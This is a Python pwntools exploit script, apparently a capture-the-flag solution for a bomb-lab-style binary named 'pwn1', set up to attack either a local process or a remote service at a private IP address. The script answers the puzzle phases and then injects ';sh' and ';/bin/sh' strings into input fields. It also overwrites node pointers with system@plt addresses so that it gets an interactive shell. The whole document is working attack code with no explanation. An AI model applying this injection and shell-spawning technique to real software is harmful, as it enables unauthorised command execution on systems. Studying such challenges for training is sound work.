# coding=utf-8
from pwn import *

def pwn():
    BIN_PATH = './pwn1'
    DEBUG = 0
    #context.arch = 'amd64'
    context.arch = 'i386'
    context(log_level='debug')
    if DEBUG == 0:
        p = process(BIN_PATH)
        elf = ELF(BIN_PATH)
        context.log_level = 'debug'
        #context.terminal = ['tmux', 'split', '-h']
        #if context.arch == 'amd64':
        #    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #else:
        #    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    else:
        p = remote('192.168.31.49', 8000)
        elf = ELF(BIN_PATH)
        context.log_level = 'debug'

    p.sendlineafter(' number!\n', str(8585))
    p.sendlineafter(' numbers!\n', '[1, 1, 3, 5, 11, 21]')
    p.sendlineafter('right?\n', 'mappingstringsforfunandprofit{\x00')
    #gdb.attach(p, gdbscript='b *0x80488FE')
    #gdb.attach(p,'b fgets')
    p.sendlineafter('phase 4.\n', '1 1 0 0 0 2 1;sh')
    p.recvuntil('seecret...\n')
    p.sendafter('node #1 to: ',  p32(elf.plt['system'])+p32(elf.plt['system']))
    p.sendafter('node #2 to: ', ';/bin/sh\0')
    p.sendafter('node #3 to: ', p32(elf.plt['system']) + p32(0x08048696))
    p.sendafter('node #4 to: ', p32(elf.plt['system']) + p32(elf.plt['system']))
    p.sendafter('node #5 to: ', p32(elf.plt['system']) + p32(0x080484fa))
    p.sendafter('node #6 to: ', p32(elf.plt['system']) + p32(elf.plt['system']))

    p.interactive()
    raw_input()
    p.close()


if __name__ == '__main__':
    pwn()
